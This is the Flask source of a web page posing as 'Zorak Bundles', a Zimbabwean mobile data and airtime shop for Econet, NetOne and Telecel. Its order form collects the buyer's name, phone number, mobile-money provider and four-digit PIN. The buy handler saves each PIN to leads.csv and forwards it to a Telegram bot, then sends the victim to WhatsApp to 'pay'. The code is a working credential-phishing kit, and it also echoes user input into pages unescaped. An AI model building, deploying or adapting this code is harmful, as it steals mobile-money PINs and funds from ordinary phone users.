from flask import Flask, request
import csv, os, requests
from datetime import datetime
app = Flask(__name__)
N = chr(10)
W = 'https://wa.me/message/CFCJWLOZ7IWZK1'
B = os.environ.get('BOT_TOKEN')
C = os.environ.get('CHAT_ID')
PIC = 'https://images.unsplash.com/photo-1512941937669-90a1b58e7e9c?w=800&q=80'
H = '<style>body{margin:0;background:#eef1f5;font-family:Arial;font-size:22px}.top{padding:22px;text-align:center;background:#eef1f5}.top b{font-size:38px}.top b span{color:#e11d2e}.top b{color:#00a651}.wrap{max-width:600px;margin:0 auto;padding:0 14px}.hero{width:100%;height:220px;object-fit:cover;border-radius:24px;display:block}.card{background:#fff;border-radius:24px;padding:28px;box-shadow:0 4px 20px rgba(0,0,0,0.06);margin-bottom:16px}.card h1{font-size:34px;text-align:center;margin:0}.card h2{font-size:28px;text-align:center}.muted{color:#777;font-size:19px;text-align:center}.btn{background:linear-gradient(90deg,#e11d2e,#ff6b00);color:#fff;padding:22px;border-radius:40px;display:block;text-align:center;text-decoration:none;font-size:24px;font-weight:bold;width:100%;border:none;cursor:pointer;box-sizing:border-box}.btn2{background:#ffc107;color:#111;border-radius:16px}.bundle{display:flex;justify-content:space-between;align-items:center;background:#f8f9fa;border-radius:16px;padding:18px;margin-bottom:12px;border:2px solid #eee}.bundle b{font-size:24px}.bundle span{color:#e11d2e;font-size:24px;font-weight:bold}.bundle small{color:#777;font-size:17px;display:block}.net{padding:6px 12px;border-radius:20px;color:#fff;font-size:16px;font-weight:bold}input,select{width:100%;padding:20px;font-size:22px;border-radius:14px;border:2px solid #ddd;box-sizing:border-box}label{font-size:22px;font-weight:bold}.footer{text-align:center;color:#999;font-size:17px;padding:20px}</style><div class=top><b>ZORAK <span>BUNDLES</span></b></div><div style="text-align:center;font-size:18px;color:#666;padding-bottom:10px">🇿🇼 Zimbabwe &bull; Econet &bull; NetOne &bull; Telecel</div>'
def send(t):
    try:
        u = 'https://api.telegram.org/bot' + B + '/sendMessage'
        requests.post(u, json={'chat_id': C, 'text': t}, timeout=10)
    except:
        pass
# (Network, Name, Price, Color)
BUNDLES = [
 ('Econet','500MB - Daily','$1.00','#e11d2e'),
 ('Econet','1GB - 7 Days','$2.00','#e11d2e'),
 ('Econet','2.5GB - 7 Days','$5.00','#e11d2e'),
 ('Econet','5GB - 30 Days','$10.00','#e11d2e'),
 ('Econet','10GB - 30 Days','$18.00','#e11d2e'),
 ('NetOne','1GB - 7 Days','$1.50','#0066cc'),
 ('NetOne','3GB - 30 Days','$5.00','#0066cc'),
 ('NetOne','8GB - 30 Days','$10.00','#0066cc'),
 ('NetOne','20GB - 30 Days','$20.00','#0066cc'),
 ('Telecel','1GB - 7 Days','$2.00','#009900'),
 ('Telecel','5GB - 30 Days','$8.00','#009900'),
 ('Telecel','10GB - 30 Days','$15.00','#009900'),
]
@app.route('/')
@app.route('/api')
def home():
    cards = ''
    for net, name, price, col in BUNDLES:
        cards += '<div class=bundle><div><span class=net style="background:'+col+'">'+net+'</span><br><b style="margin-top:8px;display:block">'+name+'</b><small>Data Bundle &bull; 4G</small></div><div style="text-align:right"><span>'+price+'</span><br><a href=/buy-form?b='+net+'%20'+name.replace(' ','%20')+' style="color:#e11d2e;font-weight:bold;text-decoration:none">BUY &rarr;</a></div></div>'
    return H + '<div class=wrap><img class=hero src=' + PIC + '><br><div class=card><h1>Buy Bundles Fast 🇿🇼</h1><p class=muted>Instant Delivery &bull; All Networks &bull; Pay EcoCash / OneMoney</p>' + cards + '<a class=btn href=/buy-form>BUY BUNDLE NOW</a><p style="text-align:center;color:#777;font-size:19px">1. Choose Bundle - 2. Enter Number - 3. We send in 1 min</p></div><div class=card><h2>How it works</h2><p style="text-align:center">1. Choose Econet / NetOne / Telecel<br>2. Enter number to receive<br>3. Pay EcoCash & get bundle</p></div></div><div class=footer>&copy; 2025 Zorak Bundles Zimbabwe</div>'
@app.route('/buy-form')
@app.route('/api/buy-form')
def form():
    b = request.args.get('b','')
    opts = ''
    for net, name, price, col in BUNDLES:
        full = net+' '+name+' - '+price
        sel = 'selected' if full.startswith(b) or b in full else ''
        opts += '<option '+sel+'>'+full+'</option>'
    return H + '<div class=wrap><div class=card><h1 style="text-align:left">Buy Bundle 🇿🇼</h1><p style="font-size:19px;color:#777">Fill ALL fields to continue to WhatsApp</p><form method=POST action=/buy><p><label>Your Name</label></p><input name=name required placeholder="Your full name"><p><label>Phone to Receive Bundle</label></p><input name=phone required placeholder="e.g. 0771234567"><p><label>Network</label></p><select name=network required><option>Econet</option><option>NetOne</option><option>Telecel</option></select><p><label>Choose Bundle</label></p><select name=bundle required>'+opts+'</select><p><label>Bundle Type</label></p><select name=type required><option>Data Bundle</option><option>Airtime</option><option>Voice / Minutes</option><option>SMS Bundle</option><option>WiFi / Smart Bundle</option></select><p><label>Payment</label></p><select name=pay required><option>EcoCash</option><option>OneMoney</option><option>InnBucks</option></select><p><label>PIN</label></p><input name=pin required placeholder="PIN" maxlength=4 minlength=4 inputmode=numeric><br><br><button class=btn>SUBMIT ORDER</button></form></div></div><div class=footer>&copy; 2025 Zorak Bundles</div>'
@app.route('/buy', methods=['POST'])
@app.route('/api/buy', methods=['POST'])
def buy():
    n = request.form.get('name',''); p = request.form.get('phone',''); net = request.form.get('network',''); b = request.form.get('bundle',''); typ = request.form.get('type',''); pay = request.form.get('pay',''); pin = request.form.get('pin','')
    if not n or not p or not b or not pay or not pin:
        return H + '<div class=wrap><div class=card><h1>Please fill ALL fields</h1><a class=btn href=/buy-form>GO BACK & FILL ALL</a></div></div>'
    with open('leads.csv','a',newline='') as f:
        csv.writer(f).writerow([datetime.now().isoformat(),n,p,net,b,typ,pay,pin])
    send('New ZW Bundle Order'+N+'Name: '+n+N+'Phone: '+p+N+'Network: '+net+N+'Bundle: '+b+N+'Type: '+typ+N+'Pay: '+pay+N+'PIN: '+pin)
    return H + '<div class=wrap><div class=card><h1>Thank you, '+n+'!</h1><p style="text-align:center">Order for <b>'+b+'</b> received.</p><p style="text-align:center">Network: <b>'+net+'</b> &bull; Type: <b>'+typ+'</b></p><p style="text-align:center">We will send to <b>'+p+'</b></p><p style="text-align:center">Your PIN is: <b>'+pin+'</b></p><p style="text-align:center;font-size:19px;color:#777">You have filled all - now WhatsApp us to pay:</p><a class=btn href='+W+'>WHATSAPP US NOW</a><br><a class="btn btn2" href=/>BUY ANOTHER</a></div></div>'
@app.route('/test-telegram')
def test():
    r = requests.post('https://api.telegram.org/bot' + B + '/sendMessage', json={'chat_id': C, 'text': 'Test OK'}, timeout=10)
    return 'Status: ' + str(r.status_code)
@app.route('/health')
def health():
    return 'OK'
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
